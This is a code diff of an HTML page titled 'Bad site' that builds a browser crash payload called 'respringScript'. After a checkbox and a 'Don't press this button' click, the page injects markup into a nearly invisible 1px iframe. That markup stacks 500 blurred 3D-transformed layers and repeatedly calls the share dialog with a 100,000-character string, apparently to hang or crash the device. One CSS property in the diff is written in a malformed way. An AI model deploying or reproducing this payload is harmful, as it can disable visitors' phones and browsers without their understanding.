@@ -1,44 +1,68 @@
-<label>
-    <input type="checkbox" id="confirm">
-    I agree to pressing this button
-</label>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bad site</title>
+    <style>
+        body {
+            background: #000;
+            margin: 0;
+        }
+        #close-iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            border: none;
+            opacity: 0.05; 
+            pointer-events: none;
+        }
+    </style>
+</head>
 
-<br><br>
+<body>
 
-<button id="interesting" disabled>
-    Don't press this button
-</button>
+    <iframe id="close-iframe" 
+        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
+    </iframe>
+    <label>
+        <input type="checkbox" id="confirm">
+        I agree to pressing this button
+    </label>
+
+    <br><br>
+
+    <button id="interesting" disabled>
+        Don't press this button
+    </button>
 
 
-<iframe id="bad-iframe" 
-    sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
-</iframe>
+    <script>
+        const confirmCheckbox = document.getElementById("confirm");
+        const actionButton = document.getElementById("interesting");
+        const frame = document.getElementById("close-iframe");
 
-<script>
-const confirm = document.getElementById("confirm");
-const button = document.getElementById("interesting");
+        confirmCheckbox.addEventListener("change", () => {
+           actionButton.disabled = !confirmCheckbox.checked;
+        });
 
-confirm.addEventListener("change", () => {
-    button.disabled = !confirm.checked;
-});
-
-button.addEventListener("click", () => {
-        window.onload = function() {
-            const frame = document.getElementById('bad-iframe');
-            const respringScript = `
+       actionButton.addEventListener("click", () => {
+           const respringScript = `
                 <html>
                 <body style="margin:0; overflow:hidden;">
                     <script>
                         const container = document.createElement('div');
                         container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                         document.body.appendChild(container);
-
+                        
                         for (let i = 0; i < 500; i++) {
                             let d = document.createElement('div');
-                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop filter: blur (100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
                             container.appendChild(d);
                         }
-
+                        
                         setInterval(() => {
                             try {
                                 navigator.share({ title: 'R', text: 'R'.repeat(100000) });
@@ -49,8 +73,7 @@ button.addEventListener("click", () => {
                     <\/script>
                 </body>
                 </html>
-            `;
+           `;
             frame.srcdoc = respringScript;
-        };
-});
-</script>
+        });
+    </script>
